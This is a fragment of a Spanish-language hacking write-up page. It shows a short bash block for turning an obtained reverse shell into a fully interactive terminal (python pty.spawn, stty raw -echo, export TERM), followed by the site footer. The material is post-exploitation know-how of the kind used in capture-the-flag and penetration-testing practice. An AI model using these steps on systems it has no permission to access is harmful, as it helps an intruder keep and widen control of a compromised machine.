<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># En la shell inversa obtenida, ejecutar:</span></span>
<span class="line"><span style="color:#B392F0">python3</span><span style="color:#79B8FF"> -c</span><span style="color:#9ECBFF"> âimport</span><span style="color:#9ECBFF"> pty</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">pty.spawn(</span><span style="color:#B392F0">"/bin/bash"</span><span style="color:#E1E4E8">)â</span></span>
<span class="line"><span style="color:#B392F0">Ctrl+Z</span><span style="color:#6A737D"> # Presionar las teclas</span></span>
<span class="line"><span style="color:#B392F0">stty</span><span style="color:#9ECBFF"> raw</span><span style="color:#79B8FF"> -echo</span><span style="color:#E1E4E8">; </span><span style="color:#79B8FF">fg</span></span>
<span class="line"><span style="color:#B392F0">reset</span><span style="color:#9ECBFF"> xterm</span></span>
<span class="line"><span style="color:#F97583">export</span><span style="color:#E1E4E8"> TERM</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">xterm</span></span></code></pre> </div> </main> </div>  <footer class="py-1 mt-12 text-gray-400" style="background-color: #13151a;"> <div class="max-w-screen-xl mx-auto px-4 text-center space-y-0 text-sm"> <p>&copy; 4jh4ck 2025 - Writeups Hacking. Todos los derechos reservados.</p> <p>
Design by: 4jh4ck, Original Design:
<a href="https://github.com/midudev" target="_blank" rel="noopener" class="hover:text-[#bfff00] transition-colors">@Midudev</a> </p> <p>
Theme Inspiration:
<a href="https://github.com/midudev/astro-5-dev-books" target="_blank" rel="noopener" class="hover:text-[#bfff00] transition-colors">astro-5-dev-books</a> </p> </div> </footer>  </main> </div> </body></html>